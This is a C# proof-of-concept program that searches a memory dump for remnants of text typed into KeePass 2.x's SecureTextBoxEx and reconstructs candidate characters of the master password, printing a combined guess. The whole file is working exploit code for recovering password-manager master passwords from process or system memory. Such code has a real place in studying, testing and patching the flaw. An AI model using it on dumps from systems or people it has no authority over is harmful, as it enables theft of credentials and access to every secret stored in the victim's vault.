// Simple POC script that searches a memory dump 
// for passwords written inside KeePass 2.x SecureTextBoxEx 
// text box, such as the master password.

// usage:
// dotnet run <path_to_dump>

using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

class Program
{
    // What characters are valid password characters
    const string allowedChars = "^[\x20-\x7E]+$";
    // Read file in N-sized chunks
    const int bufferSize = 524288; //2^19
    static string passwordChar = "●";

    static void Main(string[] args)
    {
        // Windows terminal has issues displaying "●"
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            passwordChar = "*";
        }

        if (args.Length != 1)
        {
            Console.WriteLine("Please specify a file path as an argument.");
            return;
        }

        string filePath = args[0];
        if (!File.Exists(filePath))
        {
            Console.WriteLine("File not found.");
            return;
        }

        Dictionary<int, HashSet<string>> candidates = new Dictionary<int, HashSet<string>>();

        int currentStrLen = 0;
        string debugStr = "";

        using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            byte[] buffer = new byte[bufferSize];
            int bytesRead;

            while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
            {
                for (int i = 0; i < bytesRead - 1; i++)
                {
                    // ● = 0xCF 0x25
                    if (buffer[i] == 0xCF && buffer[i + 1] == 0x25)
                    {
                        currentStrLen++;
                        i++;
                        debugStr += passwordChar;
                    }
                    else
                    {
                        if (currentStrLen != 0)
                        {
                            currentStrLen++;

                            string strChar = "";
                            try
                            {
                                byte[] character = new byte[] { buffer[i], buffer[i + 1] };
                                strChar = System.Text.Encoding.Unicode.GetString(character);
                            }
                            catch { continue; }

                            bool isValid = Regex.IsMatch(strChar, allowedChars);

                            if (isValid)
                            {
                                // Convert to UTF 8                            
                                if (!candidates.ContainsKey(currentStrLen))
                                    candidates.Add(currentStrLen, new HashSet<string>() { strChar });
                                else
                                {
                                    if (!candidates[currentStrLen].Contains(strChar))
                                        candidates[currentStrLen].Add(strChar);
                                }

                                debugStr += strChar;
                                Console.WriteLine("Found: " + debugStr);
                            }

                            currentStrLen = 0;
                            debugStr = "";
                        }
                    }
                }
            }
        }

        // Print summary
        Console.WriteLine("\nPassword candidates (character positions):");
        Console.WriteLine($"Unknown characters are displayed as \"{passwordChar}\"");

        Console.WriteLine($"1.:\t{passwordChar}");
        string combined = passwordChar;
        int count = 2;
        foreach (KeyValuePair<int, HashSet<string>> kvp in candidates.OrderBy(x => x.Key))
        {
            while (kvp.Key > count)
            {
                Console.WriteLine($"{count}.:\t{passwordChar}");
                combined += passwordChar;
                count++;
            }            

            Console.Write($"{kvp.Key}.:\t");
            if (kvp.Value.Count != 1)
                combined += "{";
            foreach (string c in kvp.Value)
            {
                Console.Write($"{c}, ");

                combined += c;
                if (kvp.Value.Count != 1)
                    combined += ", ";
            }
            if (kvp.Value.Count != 1)
                combined = combined.Substring(0, combined.Length - 2) + "}";

            Console.WriteLine();
            count++;
        }
        Console.WriteLine("Combined: " + combined);
    }
}
